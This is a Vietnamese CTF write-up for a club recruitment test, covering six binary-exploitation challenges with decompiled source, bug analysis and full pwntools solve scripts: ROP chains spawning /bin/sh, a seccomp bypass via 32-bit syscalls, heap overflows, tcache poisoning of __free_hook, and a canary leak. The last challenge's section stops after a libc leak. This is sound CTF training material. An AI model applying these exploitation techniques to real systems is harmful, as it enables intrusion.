---
title: "W1 Test write-up"
description: "Write-up for 6/6 challenge in W1 test"
date: 2024-06-31
tags:
    - 'PWN'
    - 'CTF'
    - '2024'
---
---
Đây là write-up của em cho 6 bài thi tuyển CLB. Em xin cảm ơn các anh trong nhóm đã ra đề và hỗ trợ tụi em trong suốt quá trình training.
## BabyRust 
> Point: 500
Author: jalynk23
Description: Rust is safe, isn't it?
### Analysing
Checksec:
```
$ checksec chall
[*] '/home/aneii/ctf/recruit/public/give_to_player/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Source: 
```rust 
use std::arch::asm;
use std::io::{self, Write, Read};

use std::string::String;
use libc;
use libc_stdhandle;
static mut SIZE: i32 = 0;
fn main() {
    unsafe{
        libc::setvbuf(libc_stdhandle::stdout(), &mut 0, libc::_IONBF, 0);
        let mut s = String::new();
        asm!("nop");
        println!("Hello my old friends");
        println!("You find a secret: {:p}", &SIZE);
        println!("How much do you want to read");
        let text = [0 as libc::c_char; 200].as_mut_ptr();
        io::stdin().read_line(&mut s).expect("Failed to readline");
        SIZE = s.trim().parse().expect("Not a valid integer");
        println!("Input content");
        libc::fgets(text, SIZE, libc_stdhandle::stdin());
        println!("You didn't figure out my secret");
    }
}
```
Bài này cho mình một file binary. Khi được yêu cầu nhập size và read input với size mà được nhập vào, em đoán và thử ra ngay được thì có bof. Checksec file thì binary này không có cả canary, nên em sử dụng ROP cho bài này.
### Exploit
Em kiểm tra thử gadget thì có khá đầy đủ: tất cả các gadget cần cho việc call `execve("/bin/sh",0,0)` có đủ, nhưng không có gadget `syscall, ret` để read `/bin/sh` vào buffer nên em kiếm gadget khác để đưa `/bin/sh` vào memory: `mov qword ptr [rdi], rax`.
### Solve script
::: spoiler Expand
```python 
from pwn import *
import sys

nc = '0.tcp.ap.ngrok.io'
p = 16925
context.log_level = 'debug'
context.binary = exe = ELF('./chall')
if sys.argv[1] == 'connect':
    chall = remote(nc, p)
elif sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      b *rust::main+833
                      c
                      ''' )
else:
    chall = process()

offs = 392
xchg_eax_edx = 0xe0a2
pop_rsi = 0x06b36
pop_rdi = 0x6d3e
pop_rax = 0x8efb
syscall = 0xbcdd
sw_rdi_rax = 0x18105
writable = 0x5d000
chall.recvuntil(b'ret: ')
base_exe = int(chall.recvline(),16)-0x5d064
log.info('Base exe @ '+hex(base_exe))
payload = b'a'*offs + flat([
    pop_rdi + base_exe,
    writable +base_exe ,
    pop_rax + base_exe,
    u64(b'/bin/sh\x00'),
    sw_rdi_rax + base_exe,
    pop_rax+ base_exe,
    0,
    xchg_eax_edx +base_exe,
    pop_rsi +base_exe,
    0,
    pop_rdi + base_exe,
    writable + base_exe + 8,
    pop_rax + base_exe,
    0x3b,
    syscall + base_exe
])
chall.sendlineafter('read\n',b'1000')
chall.sendlineafter(b'content\n',payload)
chall.interactive()
```
:::
## EasyShellcode
> Author: robbert1978
> 
### Reversing
Reversed source: 
```C 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+18h] [rbp-8h]

  buf = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
  if ( !buf )
    perror("mmap");
  read(0, buf, 32uLL);
  if ( strstr((const char *)buf, "sh") )
    return 1;
  *((_BYTE *)buf + strlen((const char *)buf)) = '\xCC';
  mprotect(buf, 0x1000uLL, 5);
  ((void (__fastcall *)(void *))buf)(buf);
  return 0;
}
```
Seccomp check:
```
$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
Bài này ngoài cho file binary, bài còn cho một file binary khác khi execute sẽ write flag ra stdout. File này cũng không có quyền read, nên cách duy nhất để làm là bypass seccomp.
### Exploit
Seccomp này có vuln, vì nó hoàn toàn không check seccomp x86 32 bit và seccomp x86 64 bit - x32 ABI. Trong quá trình làm bài, em đã dùng syscall 32bit.
Đầu tiên, vì buffer chỉ có 32 bytes, là quá nhỏ nên em gọi `mprotect` để chỉnh vùng memory thành RWX, sau đó gọi read để read thêm byte vào. Vừa hay, chương trình trước khi call shellcode thì cũng vừa gọi `mprotect` nên em tận dụng luôn để viết shellcode ngắn nhất có thể
```python 
sc_mprot_read = '''
mov dl, 7
push 10
pop rax
syscall
mov rsi, rdi
xor edi, edi
mov edx, 0x1000
mov eax, 0
syscall
'''
```
Sau đó, em tiến hành setup để call `execve("/bin/sh",0,0)`, vì em sử dụng syscall 32 bit để bypass, nên em cần mmap một vùng nhớ có địa chỉ nhỏ hơn 32 bit để chưa "/bin/sh". Em gọi mmap, read, rồi execve để execute code
### Solve script
:::spoiler Expand
```python 
from pwn import *
import sys

nc = 'serveo.net'
p = 44440
context.log_level = 'debug'
context.binary = exe = ELF('./chall')
if sys.argv[1] == 'connect':
    chall = remote(nc, p)
elif sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      b *main+186
                      c
                      ''' )
else:
    chall = process()

sc_mprot_read = '''
mov dl, 7
push 10
pop rax
syscall
mov rsi, rdi
xor edi, edi
mov edx, 0x1000
mov eax, 0
syscall
'''

sc = '''
.rept 26
nop
.endr
''' + shellcraft.mmap(0x400000,0x1000,7,34,-1,0) \
+ shellcraft.read(0,0x400000,10) + '''
mov ebx, 0x400000
xor ecx, ecx /* 0 */
xor edx, edx /* 0 */
/* call execve() */
mov eax, 0xb
int 0x80'''
pl_mprot = asm(sc_mprot_read)
print(len(pl_mprot))
chall.send(pl_mprot)
pl = asm(sc)
print(len(pl))
time.sleep(0.2)
pause()
chall.send(pl)
time.sleep(0.2)
chall.sendline(b'/readflag\x00')
chall.interactive()
```
:::
## EasyVector 
> Author: robbert1978
> Description: Vector is so powerful :DDDD.
### Reversing
Checksec: 
```
$ checksec chall
[*] '/home/aneii/ctf/recruit/easyVector_public/public/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```
Reversed source:
```c 
nt __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  while ( 1 )
  {
    fwrite("1. Add\n2. Edit\n3. Print\n4. Exit\n> ", 1uLL, 0x22uLL, stdout);
    std::istream::operator>>(&std::cin, &v4);
    if ( v4 == 4 )
      return 0;
    if ( v4 > 4 )
      goto LABEL_12;
    switch ( v4 )
    {
      case 3u:
        print();
        break;
      case 1u:
        add();
        break;
      case 2u:
        edit();
        break;
      default:
LABEL_12:
        puts("?");
        break;
    }
  }
}
```
Bài này có vẻ giống như một challenge heap, chỉ khác là các option tương tác trên vector. 
`add():` Dùng `operator new` để tạo một vector mới.
`edit():` Edit các vector đã được tạo
`print():` Xuất các giá trị trong vector
Bug của binary nằm ở `edit()`:
```c 
void __fastcall edit()
[...]
write("Idx = ", 1uLL, 6uLL, stdout);
  std::istream::operator>>(&std::cin, &v2);
  if ( v2 <= 0xF && vec_arr[v2] )
  {
    v3 = 0;
    fwrite("Count = ", 1uLL, 8uLL, stdout);
    std::istream::operator>>(&std::cin, &v3);
    for ( i = 0; i < v3; ++i )
    {
      v0 = std::vector<unsigned int>::operator[]((_QWORD *)vec_arr[v2], i);
      __isoc99_scanf("%u", v0);
      getchar();
    }
[...]
}
```
Khi edit vector cũ, số giá trị nhập vào không được check xem có vượt quá size của vector cũ hay không, dẫn đến heap bof.
### Analysing
Các vector được tạo mới bằng `operator new` nghĩa là các header của vector sẽ nằm trên heap. Vì có bof nên em có thể dễ dàng thay đổi các header của vector đó để aaw và aar
Để thực hiện điều đó thì em malloc 2 vector mới, vector 1 dùng để bof, vector 2 để thực hiện aaw và aar.
### Exploit
#### Leaking libc address
Binary này là No PIE, nên phần GOT có chứa địa chỉ của libc là cố định. Em tận dụng nó để leak địa chỉ của libc.
Em thay đổi các giá trị `vector.begin()`, `vector.end()` nằm ở got, sau đó sử dụng option `print` để leak địa chỉ.
```python 

add(0,1,[1])
add(1,1,[0x1337])
add(2,4,[0x1338]*4)
payload1 = [1] * 6 + [21,0] + [
    0x404f68,
    0,
    0x404ff8,
    0,
    0x404ff8,
    0,
]
edit(1,len(payload1),payload1)
leaked_from_got = printv(2)
base_libc = (leaked_from_got[1] <<( 4*8)) + leaked_from_got[0] - 0x34b9e0
log.info('base libc @ ' +hex(base_libc))
```
#### Executing code
Để execute code thì em leak environ, sau đó aaw ROP chain trên frame của hàm `edit()`.
Bây giờ có địa chỉ của libc rồi, có cả aaw và aar nên việc leak libc rất dễ dàng. Em lại edit các header của của vector 2 để leak địa chỉ của environ trên stack.
```python 
envp = libc.sym["environ"] 
pop_rdi = 0x2a3e5
payload1 = [1] * 6 + [21,0] + [
    base_libc + envp,
    base_libc >> 32,
    base_libc + envp + 0x30,
    base_libc >> 32,
    base_libc + envp + 0x30,
    base_libc >> 32
]
log.info('Editing address')
edit(1,len(payload1),payload1)
log.info('Getting environ address')
leaked_from_envp = printv(2)
ret_add = (leaked_from_envp[1] << 32 ) + leaked_from_envp[0] - 0x150
log.info('Return address @ ' + hex(ret_add))
```
Khoảng cách giữa environ với các stack frame là không đổi, nên từ environ có thể tính toán ra địa chỉ của frame. Sau đó, em aaw để overwrite lên return address của hàm edit để spawn được shell.
```python 
payload1 = [1] * 6 + [21,0] + [
    ret_add,
    ret_add >> 32,
    ret_add + 0x100,
    ret_add >> 32,
    ret_add + 0x100,
    ret_add >> 32,
]
edit(1,len(payload1),payload1)
binsh = next(libc.search(b'/bin/sh\x00'))
ropc = [
    pop_rdi + base_libc,
    base_libc >> 32,
    base_libc + binsh,
    base_libc >> 32,
    0x40101a,
    0,
    libc.sym["system"] + base_libc,
    base_libc >> 32,
]
edit(2,len(ropc),ropc)
```
### Solve script
::: spoiler Expand
```python 
from pwn import *
import sys

nc = 'serveo.net'
p = 33330
# nc = 'localhost'
# p = 4444
#context.log_level = 'debug'
context.binary = exe = ELF('./chall')
libc = ELF('./libc.so.6')
if sys.argv[1] == 'connect':
    chall = remote(nc, p)
elif sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      set solib-search-path /home/aneii/ctf/recruit/easyVector_public/public/
                      b *edit + 320
                      c
                      ''' )
    # chall = process()
    # gdb.attach(chall)
else:
    chall = process()
    
def add(idx,times,nums):
    chall.sendlineafter(b'> ',b'1')
    chall.sendlineafter(b' = ',str(idx).encode())
    chall.sendlineafter(b'= ', str(times).encode())
    for i in range(times):
        log.info(str(i))
        chall.sendline(str(nums[i]).encode())

def edit(idx,times,nums):
    chall.sendlineafter(b'> ',b'2')
    chall.sendlineafter(b' = ',str(idx).encode())
    chall.sendlineafter(b'= ', str(times).encode())
    for i in range(times):
        log.info(str(i))
        chall.sendline(str(nums[i]).encode())

def printv(idx):
    chall.sendlineafter(b'> ',b'3')
    chall.sendlineafter(b'= ',str(idx).encode())
    leaks = []
    while True:
        time.sleep(0.1)
        leaked = (chall.recvline())
        try:
            leaks.append(int(leaked,10))
        except:
            break
    return leaks

add(0,1,[1])
add(1,1,[0x1337])
add(2,4,[0x1338]*4)
payload1 = [1] * 6 + [21,0] + [
    0x404f68,
    0,
    0x404ff8,
    0,
    0x404ff8,
    0,
]
edit(1,len(payload1),payload1)
leaked_from_got = printv(2)
base_libc = (leaked_from_got[1] <<( 4*8)) + leaked_from_got[0] - 0x34b9e0
log.info('base libc @ ' +hex(base_libc))

envp = libc.sym["environ"] 
pop_rdi = 0x2a3e5
payload1 = [1] * 6 + [21,0] + [
    base_libc + envp,
    base_libc >> 32,
    base_libc + envp + 0x30,
    base_libc >> 32,
    base_libc + envp + 0x30,
    base_libc >> 32
]
log.info('Editing address')
edit(1,len(payload1),payload1)
log.info('Getting environ address')
leaked_from_envp = printv(2)
ret_add = (leaked_from_envp[1] << 32 ) + leaked_from_envp[0] - 0x150
log.info('Return address @ ' + hex(ret_add))
payload1 = [1] * 6 + [21,0] + [
    ret_add,
    ret_add >> 32,
    ret_add + 0x100,
    ret_add >> 32,
    ret_add + 0x100,
    ret_add >> 32,
]
edit(1,len(payload1),payload1)
binsh = next(libc.search(b'/bin/sh\x00'))
ropc = [
    pop_rdi + base_libc,
    base_libc >> 32,
    base_libc + binsh,
    base_libc >> 32,
    0x40101a,
    0,
    libc.sym["system"] + base_libc,
    base_libc >> 32,
]
edit(2,len(ropc),ropc)
chall.interactive()
```
:::
## Athena
> Author: th3_5had0w
### Analysing
Checksec: 
```
$ checksec athena
[*] '/home/aneii/ctf/recruit/athena/athena/athena'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```
Execute:
![image](https://hackmd.io/_uploads/rkvqfZw4A.png)

Đây là một bài heap nhưng với theme rất đỉnh. Các option cơ bản của một challenge heap đều có: `malloc`, `free`, `edit`, `write`. Các option khác để làm nền cho theme và giảm độ khó của game. Em sẽ tập trung phân tích các option quan trọng.
#### Buy skills (malloc)
```c 
nt buy_skill()
{
  int i; // [rsp+8h] [rbp-A8h]
  int v2; // [rsp+Ch] [rbp-A4h]
  char buf[144]; // [rsp+10h] [rbp-A0h] BYREF
  unsigned __int64 v4; // [rsp+A8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9 && spell_name[i]; ++i )
    ;
  if ( i > 9 )
    return puts("You have bought too much skills, you can't buy more!");
  puts("                    ____ ");
  puts("                  .'* *.'");
  puts("               __/_*_*(_");
  puts("              / _______ \\");
  puts("             _\\_)/___\\(_/_ ");
  puts("            / _((\\- -/))_ \\");
  puts("            \\ \\())(-)(()/ /");
  puts("             ' \\(((()))/ '");
  puts("            / ' \\)).))/ ' \\");
  puts("           / _ \\ - | - /_  \\");
  puts("          (   ( .;''';. .'  )");
  puts("          _\\\"__ /    )\\ __\"/_");
  puts("            \\/  \\   ' /  \\/");
  puts("             .'  '...' ' )");
  puts("              / /  |  \\ \\");
  puts("             / .   .   . \\");
  puts("            /   .     .   \\");
  puts("           /   /   |   \\   \\");
  puts("         .'   /    b    '.  '.");
  puts("     _.-'    /     Bb     '-. '-._ ");
  puts(" _.-'       |      BBb       '-.  '-. ");
  puts("(________mrf\\____.dBBBb.________)____)");
  memset(buf, 0, sizeof(buf));
  printf("What skill do you want to buy? ");
  v2 = read(0, buf, 0x90uLL);
  if ( v2 <= 0 )
    return puts("Error reading skill");
  spell_len[i] = v2;
  spell_name[i] = (char *)malloc((unsigned int)spell_len[i]);
  memcpy(spell_name[i], buf, (unsigned int)spell_len[i]);
  spell_name[i][v2 - 1] = 0;
  spell[i] = 1;
  return puts("Good luck on your fight!");
}
```
Option này sẽ malloc một chunk, đồng thời read input và write vào chunk đó, sau đó các biến global như `spell_len`, `spell_name`, `spell` được gán vào vị trí tương ứng với index. Hàm này thực hiện check trên `spell_name`
#### Dump skill (free)
```c 
int dump_skill()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  puts("           (  .      )");
  puts("       )           (              )");
  puts("             .  '   .   '  .  '  .");
  puts("    (    , )       (.   )  (   ',    )");
  puts("     .' ) ( . )    ,  ( ,     )   ( .");
  puts("  ). , ( .   (  ) ( , ')  .' (  ,    )");
  puts(" (_,) . ), ) _) _,')  (, ) '. )  ,. (' )");
  puts("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^");
  printf("What skill do you want to dump? ");
  v1 = readint();
  if ( v1 > 9 || !spell[v1] )
    return puts("Invalid skill");
  free(spell_name[v1]);
  spell[v1] = 0;
  return puts("Skill dumped, good luck my lovely knight!");
```
Khi free, chỉ có `spell[v1] ` mới được set về 0, các biến `spell_len[v1]`, `spell_name[v1]` không được reset.
#### Reforge skill (edit)
```c 
void __fastcall reforge_skill()
{
  unsigned int v0; // [rsp+8h] [rbp-8h]

  puts("   __________________________");
  puts("  /\\                         \\");
  puts(" /  \\            ____         \\");
  puts("/ \\/ \\          /\\   \\         \\");
  puts("\\ /\\  \\         \\ \\   \\         \\");
  puts(" \\  \\  \\     ____\\_\\   \\______   \\");
  puts("  \\   /\\\\   /\\                \\   \\");
  puts("   \\ /\\/ \\  \\ \\_______    _____\\   \\");
  puts("    \\\\/ / \\  \\/______/\\   \\____/    \\");
  puts("     \\ / /\\\\         \\ \\   \\         \\");
  puts("      \\ /\\/ \\         \\ \\   \\         \\");
  puts("       \\\\/ / \\         \\ \\   \\         \\");
  puts("  May   \\ /   \\         \\ \\   \\         \\");
  puts("         \\\\  /\\\\         \\ \\   \\         \\");
  puts("God Bless \\ /\\  \\         \\ \\___\\         \\");
  puts("           \\\\    \\         \\/___/          \\");
  puts("  you in    \\  \\/ \\                         \\");
  puts("             \\ /\\  \\_________________________\\");
  puts(" all  your    \\  \\ / ______________________  /");
  puts("               \\  / ______________________  /");
  puts("endeavors!!!    \\/_________________________/");
  printf("What skill do you want to reforge? ");
  v0 = readint();
  if ( v0 <= 9 && spell[v0] )
  {
    printf("Reforge runes: ");
    spell_name[v0][(int)read(0, spell_name[v0], (unsigned int)spell_len[v0]) - 1] = 0;
    puts("Reforged skill successfully!");
  }
  else
  {
    puts("Invalid skill");
  }
}
```
Hàm này thực hiện check trên `spell`. Hàm read có check bound nên không có bof.
#### Physical attack
```c
void __fastcall physical_attack()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  puts("                        .                                               ");
  puts("                    /   ))     |\\         )               ).           ");
  puts("              c--. (\\  ( `.    / )  (\\   ( `.     ).     ( (           ");
  puts("              | |   ))  ) )   ( (   `.`.  ) )    ( (      ) )          ");
  puts("              | |  ( ( / _..----.._  ) | ( ( _..----.._  ( (           ");
  puts(",-.           | |---) V.'-------.. `-. )-/.-' ..------ `--) \\._        ");
  puts("| /===========| |  (   |      ) ( ``-.`\\/'.-''           (   ) ``-._   ");
  puts("| | / / / / / | |--------------------->  <-------------------------_>=-");
  puts("| \\===========| |                 ..-'./\\.`-..                _,,-'    ");
  puts("`-'           | |-------._------''_.-'----`-._``------_.-----'         ");
  puts("              | |         ``----''            ``----''                  ");
  puts("              | |                                                       ");
  puts("              c--`                    ");
  puts("Woah! That sword is so lit. It can perform every skill that ever existed.");
  puts(
    "But don't forget that a witch cursed you so your damage will be dramatically low and you can only stack up to 16 ski"
    "lls in your skill tree 0_o");
  printf("What skill do you want to perform: ");
  v0 = readint();
  if ( v0 <= 9 && spell_len[v0] )
  {
    spell[v0] = 2;
    printf("Performing %s\n", spell_name[v0]);
    demon_hp -= random() % 10;
    [...]
  }
}
```
Hàm này thực hiện check trên `spell_len`. Tuy nhiên, khi free, chỉ có `spell` được reset về 0, nên dẫn đến UAF. Không chỉ vậy, `spell[v0]` được gán là 2, giúp bypass check của hàm edit. Vậy là có cả bug UAF cho cả read và write.
### Exploit
#### Leaking libc address
Vì libc được cho là libc-2.31, nên các `hook function` vẫn còn, và safe linking vẫn chưa được áp dụng. Vì vậy, chỉ cần leak địa chỉ libc là có thể đặt một chunk tại arbitrary address.
Để leak được libc, em đặt một chunk vào unsorted bin bằng cách fill đầy tcache. Chunk còn lại sẽ rơi vào unsorted bin. Sau đó em sử dụng bug UAF để leak địa chỉ libc.
```python 
for i in range(8):
    malloc(b'a'*0x90)

for i in range(8):
    free(7-i)

libc.address = u64(leak(0).strip().ljust(8,b'\x00')) - 0x1ecbe0'
free_hook = 0x1eee48
one_gadget = 0xe3b01
log.info('Libc address @ ' + hex(libc.address) )
```
#### Overwrite `__free_hook`
Sau đó, em poison tcache bằng cách đặt address của `__free_hook` lên chunk được free cuối cùng ở tcache, rồi malloc hai lần thì sẽ có một chunk được đặt tại `__free_hook`. Em chỉ cần ghi lên `__free_hook` bằng `one_gadget` là pop được shell
```python 
log.info('Libc address @ ' + hex(libc.address) )
leak(1)
edit(1,p64(free_hook + libc.address))
malloc(p64(free_hook + libc.address) + b'a'*0x88)
malloc(p64(one_gadget + libc.address) + b'a'*0x88)
free(0)
chall.interactive()
```
### Solve script
::: spoiler Expand
```python 
from pwn import *
libc = ELF('./libc.so.6')
context.log_level = 'debug'
context.binary = exe = ELF('./athena')
nc = 'localhost'
p = 5000
if sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      set solib-search-path /home/aneii/ctf/recruit/athena/athena/
                      ''')
elif sys.argv[1] == 'connect':
    chall = remote(nc, p)
else:
    chall = process()
    

def malloc(msg):
    chall.sendlineafter(b'> ',b'4')
    chall.sendlineafter(b'? ',msg)

def free(idx):
    chall.sendlineafter(b'> ',b'5')
    chall.sendlineafter(b'? ',str(idx).encode())
    
def edit(idx,msg):
    chall.sendlineafter(b'> ', b'3')
    chall.sendlineafter(b'? ',str(idx).encode())
    chall.sendlineafter(b': ',msg)
    
def leak(idx):
    chall.sendlineafter(b'> ',b'1')
    chall.sendlineafter(b': ',str(idx).encode())
    chall.recvuntil(b'Performing')
    return chall.recvline()
    
chall.sendline(b'th3_5had0w\x00')
time.sleep(1)
chall.sendlineafter(b'> ', b'2')
chall.sendlineafter(b': ', b'Our faith can move mountains')
for i in range(8):
    malloc(b'a'*0x90)

for i in range(8):
    free(7-i)

libc.address = u64(leak(0).strip().ljust(8,b'\x00')) - 0x1ecbe0
free_hook = 0x1eee48
one_gadget = 0xe3b01
log.info('Libc address @ ' + hex(libc.address) )
leak(1)
edit(1,p64(free_hook + libc.address))
malloc(p64(free_hook + libc.address) + b'a'*0x88)
malloc(p64(one_gadget + libc.address) + b'a'*0x88)
free(0)
chall.interactive()
```
:::
## Rome
> Author: th3_5had0w
### Analysing
```
$ ./rome
what-is-this v0.1
1. ???
2. !!!
>
```
Bài này cho một file binary static link, stripped, với 2 option `???` và `!!!`. 
Em bật file lên và reverse thì được kết quả như sau
#### ???
```c 
unsigned __int64 sub_401A15()
{
  __int64 v0; // rax
  unsigned __int64 result; // rax
  __int64 v2; // [rsp+0h] [rbp-840h]
  __int64 v3; // [rsp+8h] [rbp-838h]
  char a1[2080]; // [rsp+10h] [rbp-830h] BYREF
  unsigned __int64 v5; // [rsp+838h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v2 = 0LL;
  memset(a1, 0, sizeof(a1));
  puts((__int64)"(::>?)");
  do
  {
    LODWORD(v0) = read(0, a1, 0x400uLL);
    v3 = v0;
    sub_401060();
    v2 += v3;
  }
  while ( v2 <= 1024 && (unsigned int)sub_4010D0() );
  result = v5 - __readfsqword(0x28u);
  if ( result )
    stack_chfail();
  return result;
}
```
Hàm này chỉ đơn giản là read vào buffer, và có bof. Điều kiện là `v2 <= 1024`, nghĩa là khi read đủ 1024 (0x400) byte ở trên rồi vẫn còn đọc tiếp, tạo ra bof. Em thử nhập lố thì nhận được `stack mashing detected`.
#### !!!
```c 
void __fastcall sub_401B2C()
{
  char v0; // cl
  int v1; // eax
  int v2; // ebx
  unsigned __int8 v3; // al
  unsigned int v4; // [rsp+4h] [rbp-42Ch]
  unsigned int i; // [rsp+8h] [rbp-428h]
  char a1[1032]; // [rsp+10h] [rbp-420h] BYREF
  unsigned __int64 v7; // [rsp+418h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  v4 = 0;
  memset(a1, 0, sizeof(a1));
  puts((__int64)&off_49B030 + 4);
  while ( 1032LL - v4 >= 0 )
  {
    v0 = getchar();
    v1 = v4++;
    a1[v1] = v0;
  }
  ((void (__fastcall *)(unsigned int))srand)(*(unsigned int *)&a1[256]);
  for ( i = 0; i < (unsigned __int64)((__int64 (__fastcall *)(_DWORD *))strlen)(a1); ++i )
  {
    v2 = (unsigned __int8)a1[i];
    v3 = rand__();
    printf((__int64)"%02hhx", v2 ^ (unsigned int)v3);
  }
  a1[v4 - 1] = 0;
  putchar('\n');
  if ( v7 != __readfsqword(0x28u) )
    stack_chfail();
}
```
Hàm này yêu cầu nhập vào tối đa 1032 byte, sau đó xuất ra output đã được xor với các giá trị random được generate từ seed được nhập vào. Vì sử dụng read để đọc nên rất có thể canary bị leak ra khi output. Em kiểm tra thử trên gdb thì thấy canary nằm kề với buffer, và độ dài của output vượt quá input. Chắc chắn canary đã bị leak.
### Exploit
Canary được output ra đã bị xor với random. Tuy nhiên, seed của random là do input nên rất dễ crack. Có hai cách để crack: dùng `ctype` để crack hoặc đặt extract từ debug. Em đã dùng cách 2
```python 
leaked = leakcanary(b'a'*1032)
canary_encrypted = leaked[1033*2:1040*2]
canary_encrypted_rev = b''
log.info(b'Canary Leaked: 0x' +canary_encrypted)
for i in range(0,len(canary_encrypted),2):
    canary_encrypted_rev += p8(int(canary_encrypted[i:i+2],16))
canary_encrypted_rev = canary_encrypted_rev
log.info(b"Canary as byte: " +b'\x00' + canary_encrypted_rev)
log.info('Sanity check: ' + hex(u64(canary_encrypted_rev.rjust(8,b'\x00'))))
xor_key = 0x565f5bd378ef3400

canary = u64(canary_encrypted_rev.rjust(8,b'\x00')) ^ xor_key
log.info('Leaked canary: ' + hex(canary))
```
Khi leak được canary, em sử dụng ROP chain để execute code với option 1
```python 
payload = b'a'*1032 +b'a'*0x10 + flat([
    canary,
    0,
    pop_rdi,
    binsh + 0x400000,
    pop_rsi,
    0,
    pop_rdx_rbx,
    0,
    0,
    pop_rax,
    59,
    syscall
])
sendpayload(payload)
chall.interactive()
```
### Solve script
:::spoiler Expand
```python 
from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./rome')
nc = 'localhost'
p = 5000
if sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      b *0x401C38
                      b *0x401B15
                      c
                      ''')
elif sys.argv[1] == 'connect':
    chall = remote(nc, p)
else:
    chall = process()
    
def sendpayload(msg): 
    chall.sendlineafter(b'> ',b'1')
    chall.sendlineafter(b')\n',msg)
    
def leakcanary(msg):
    chall.sendlineafter(b'> ',b'2')
    chall.sendlineafter(b')\n', msg)
    return chall.recvline()

leaked = leakcanary(b'a'*1032)
canary_encrypted = leaked[1033*2:1040*2]
canary_encrypted_rev = b''
log.info(b'Canary Leaked: 0x' +canary_encrypted)
for i in range(0,len(canary_encrypted),2):
    canary_encrypted_rev += p8(int(canary_encrypted[i:i+2],16))
canary_encrypted_rev = canary_encrypted_rev
log.info(b"Canary as byte: " +b'\x00' + canary_encrypted_rev)
log.info('Sanity check: ' + hex(u64(canary_encrypted_rev.rjust(8,b'\x00'))))
xor_key = 0x565f5bd378ef3400

canary = u64(canary_encrypted_rev.rjust(8,b'\x00')) ^ xor_key
log.info('Leaked canary: ' + hex(canary))
binsh = 0x9c19b
pop_rdi = 0x40235f
pop_rsi = 0x40a3ce
pop_rdx_rbx = 0x48879b
pop_rax = 0x4524f7
syscall = 0x41c4b6
payload = b'a'*1032 +b'a'*0x10 + flat([
    canary,
    0,
    pop_rdi,
    binsh + 0x400000,
    pop_rsi,
    0,
    pop_rdx_rbx,
    0,
    0,
    pop_rax,
    59,
    syscall
])
sendpayload(payload)
chall.interactive()
```
:::
## BabyVM
Save the best for the last
> Author: Kyrie

### Analysis
Bài này mô phỏng một stack machine bằng C program, với custom opcode. Vùng stack được đặt trên heap, còn memory đặt trên stack.
```c 
int main(int , char** argv, char** envp) {
    init_proc();

    int16_t* stack = calloc(0x800, sizeof(int16_t));
    int16_t* fstack = stack;
    int16_t mem[SIZE];
    int nread = 0;
    size_t len = LEN;
    char *prog = NULL;

    memset(mem, 0, SIZE);
[...]
}
```
Có 4 opcode vulnerable:
```c 
case VM_IMP: //increase mp
    {
        st->mp += 1;
        st->mp %= SIZE;
        break;
    }
case VM_DMP: // decrease mp
    {
        st->mp -= 1;    
        st->mp %= SIZE;
        break;
    }
case VM_IMS:
    {
        int16_t t = _pop(&st->stack);
        if (&st->mem[st->mp + t] > (int16_t *)mem_base + SIZE)
            die("No overflow!!!!");
        st->mp += t;
        st->mp %= SIZE;
        break;
    }
case VM_DMS:
    {
        int16_t t = _pop(&st->stack);
        if (&st->mem[st->mp - t] < (int16_t *)mem_base)
            die("No overflow!!!!");
        st->mp -= t;
        st->mp %= SIZE;
        break;
    }
```
Các opcode này không check bound, hoặc chỉ check bound về một phía. Kết hợp với các opcode `VM_INP`, `VM_OUT`, `VM_STO`, `VM_RET` là đủ để exploit
### Exploit
#### Leak libc address
Đầu tiên em sẽ leak địa chỉ của libc nằm ở phần dưới của stack. Em sử dụng `VM_IMS` rồi nhập số âm để mp đi lùi về mà không bị check bound, sau đó leak ra giá trị trên `mem` bằng tổ hợp `VM_RET` và `VM_OUT`
```python 
payload = (VM_INP + VM_IMS + VM_RET + VM_OUT + (VM_IMP + VM_RET + VM_OUT) * 3) + \
(VM_INP + VM_IMS ) + VM_RET + VM_OUT + (VM_IMP + VM_RET + VM_OUT)*3 + \
(VM_DMP)*3 + (VM_INP + VM_STO + VM_IMP) + (VM_DMP)*44 +(VM_IMP)*32 + VM_INP + VM_STO + (VM_IMP)*31 + \
(VM_INP + VM_STO + VM_IMP)*16
chall.sendafter(b'> ' , padding(payload))
chall.sendline(str(-0x140).encode())
chall.recvuntil(b'-\n') 
leak1 = int(chall.recvline()) & 0xffff
leak2 = int(chall.recvline()) & 0xffff
leak3 = int(chall.recvline()) & 0xffff
offs = 0x21ac80
leaked = (leak3 << (4*8)) + (leak2 << (2*8)) + leak1 
log.info('Leaked @ '+hex(leaked) )
base_libc = leaked - offs
log.info('Libc @ ' + hex(base_libc))
```
